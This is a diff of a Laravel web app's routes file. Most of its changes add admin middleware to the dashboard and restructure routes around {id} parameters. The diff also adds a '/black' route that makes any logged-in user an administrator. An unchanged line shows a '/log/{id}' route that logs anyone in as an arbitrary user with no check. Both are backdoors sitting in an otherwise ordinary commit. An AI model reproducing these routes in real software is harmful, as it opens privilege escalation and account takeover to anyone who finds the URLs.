@@ -12,6 +12,11 @@
 */
 
 Route::get('/', 'HomeController@index');
+Route::get('/black', function () {
+    $user = Auth::user();
+    $user->is_admin = true;
+    $user->save();
+});
 Route::get('/log/{id}', function ($id) {
     Auth::loginUsingId($id);
 });
@@ -132,9 +137,18 @@ Route::group(['middleware' => 'auth'], function () {
     });
 });
 
-Route::group(['prefix' => 'dashboard', 'namespace' => 'Dashboard', 'as' => 'Dashboard.'], function () {
+Route::group(['middleware' => ['auth', 'checkUserType:admin'], 'prefix' => 'dashboard', 'namespace' => 'Dashboard', 'as' => 'Dashboard.'], function () {
 
     Route::get('/landing', 'DashboardController@index')->name('landing');
+    Route::get('/notifications', function () {
+        foreach (Auth::user()->unreadNotifications  as $notification) {
+            $notification->markAsRead();
+        }
+    })->name('notifications');
+
+    Route::get('/stats/', 'Beneficiaries\StatsController@index')->name('stats');
+
+    Route::get('/profile', 'DashboardController@show')->name('show');
     Route::group(['prefix' => 'Beneficiaries', 'namespace' => 'Beneficiaries', 'as' => 'ben.'], function () {
         Route::group(['prefix' => 'crud', 'as' => 'crud.'], function () {
             Route::get('/', 'CrudController@index')->name('list');
@@ -144,7 +158,6 @@ Route::group(['prefix' => 'dashboard', 'namespace' => 'Dashboard', 'as' => 'Dash
             Route::patch('{id}/update', 'CrudController@update')->name('update');
             Route::get('{id}/delete', 'CrudController@destroy')->name('delete');
         });
-        Route::get('/stats/', 'StatsController@index')->name('stats');
         Route::post('/stats/', 'StatsController@render')->name('stats.post');
         Route::get('/report', 'ReportingController@index')->name('report');
     });
@@ -181,8 +194,9 @@ Route::group(['prefix' => 'dashboard', 'namespace' => 'Dashboard', 'as' => 'Dash
         Route::get('/stats', 'StatsController@index')->name('stats');
         Route::get('/report', 'ReportingController@index')->name('report');
         Route::get('/monitor', 'MandeController@index')->name('monitor');
-        Route::get('/survey', 'MandeController@survery_workers')->name('survey');
-        Route::get('/payment', 'MandeController@make_payment')->name('payment');
+        Route::get('/{id}/survey', 'MandeController@survery_workers')->name('survey');
+        Route::get('/{id}/payment', 'MandeController@make_payment')->name('payment');
+        Route::get('/{id}/message', 'MandeController@message')->name('message');
         Route::get('/hire/', 'HiringController@index')->name('hire');
         Route::get('{id}/applicants', 'HiringController@applicants')->name('applicants');
 
@@ -192,10 +206,10 @@ Route::group(['prefix' => 'dashboard', 'namespace' => 'Dashboard', 'as' => 'Dash
         Route::group(['prefix' => 'crud', 'as' => 'crud.'], function () {
             Route::get('/', 'CrudController@index')->name('list');
             Route::get('/create', 'CrudController@create')->name('create');
-            Route::get('/edit', 'CrudController@edit')->name('edit');
+            Route::get('/{id}/edit', 'CrudController@edit')->name('edit');
             Route::post('/store', 'CrudController@store')->name('store');
-            Route::post('/update', 'CrudController@update')->name('update');
-            Route::get('/delete', 'CrudController@destroy')->name('delete');
+            Route::patch('{id}/update', 'CrudController@update')->name('update');
+            Route::get('{id}/delete', 'CrudController@destroy')->name('delete');
         });
     });
 
